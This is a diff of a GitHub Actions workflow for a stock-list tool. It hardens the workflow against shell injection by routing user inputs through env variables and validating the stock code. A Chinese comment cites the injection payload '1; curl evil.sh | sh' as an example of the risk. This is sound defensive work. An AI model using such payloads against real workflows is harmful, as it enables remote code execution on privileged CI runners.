@@ -56,15 +56,36 @@ jobs:
         with:
           python-version: "3.12"
 
+      # 輸入一律走 env，不直接內插進 run 的 shell body。
+      #
+      # `${{ }}` 是在 shell 看到這段文字**之前**就被展開的——等於把使用者打的字
+      # 直接貼進腳本裡。一個 `1; curl evil.sh | sh` 就會在這台握有
+      # contents: write 的 runner 上執行。走 env 之後那些字只是變數的值，
+      # 再怎麼寫都只是一串字元。
       - name: 執行指定的動作
+        env:
+          IN_ACTION: ${{ inputs.action }}
+          IN_CODE: ${{ inputs.code }}
+          IN_YEARS: ${{ inputs.years }}
+          IN_PRICE_BUY: ${{ inputs.price_buy }}
+          IN_PER_BUY: ${{ inputs.per_buy }}
         run: |
           set -e
-          ACTION="${{ inputs.action }}"
-          CODE="${{ inputs.code }}"
-          YEARS="${{ inputs.years }}"
+          ACTION="$IN_ACTION"
+          CODE="$IN_CODE"
+          YEARS="$IN_YEARS"
+          # 代號只允許數字與英文字母（上櫃有 6xxxL 這種）。這一關擋的不是注入
+          # ——env 已經擋掉了——而是「把一坨奇怪的字送進 manage_stock.py」。
+          if [ -n "$CODE" ]; then
+            case "$CODE" in
+              *[!0-9A-Za-z]*)
+                echo "::error::股票代號只能是數字或英文字母，收到的是：$CODE"
+                exit 1 ;;
+            esac
+          fi
           EXTRA=""
-          if [ -n "${{ inputs.price_buy }}" ]; then EXTRA="$EXTRA --price-buy ${{ inputs.price_buy }}"; fi
-          if [ -n "${{ inputs.per_buy }}" ]; then EXTRA="$EXTRA --per-buy ${{ inputs.per_buy }}"; fi
+          if [ -n "$IN_PRICE_BUY" ]; then EXTRA="$EXTRA --price-buy $IN_PRICE_BUY"; fi
+          if [ -n "$IN_PER_BUY" ]; then EXTRA="$EXTRA --per-buy $IN_PER_BUY"; fi
 
           case "$ACTION" in
             "新增個股")
@@ -89,11 +110,22 @@ jobs:
         run: python manage_stock.py list
 
       - name: 更新資料並產生報告
+        id: update
         if: inputs.action != '列出目前名單'
         run: python run.py update
 
+      # 為什麼要 `|| steps.update.outcome == 'failure'`：
+      #
+      # 上面「執行指定的動作」那一步**已經改好 config.json 了**。如果報告產不
+      # 出來（來源掛掉、網路不通）就跳過提交，使用者從手機加的那一檔股票會
+      # 靜靜地消失——他看到的是一個綠色的 job，然後名單裡沒有那檔。
+      #
+      # 名單的改動與報告能不能產生是兩件事。名單先存起來，報告下一次排程會補。
       - name: 有變動才提交
-        if: inputs.action != '列出目前名單'
+        if: inputs.action != '列出目前名單' && (success() || steps.update.outcome == 'failure')
+        env:
+          IN_ACTION: ${{ inputs.action }}
+          IN_CODE: ${{ inputs.code }}
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
@@ -101,6 +133,6 @@ jobs:
           if git diff --staged --quiet; then
             echo "沒有變動，這次不提交。"
           else
-            git commit -m "手機操作：${{ inputs.action }} ${{ inputs.code }}"
+            git commit -m "手機操作：${IN_ACTION} ${IN_CODE}"
             git push
           fi
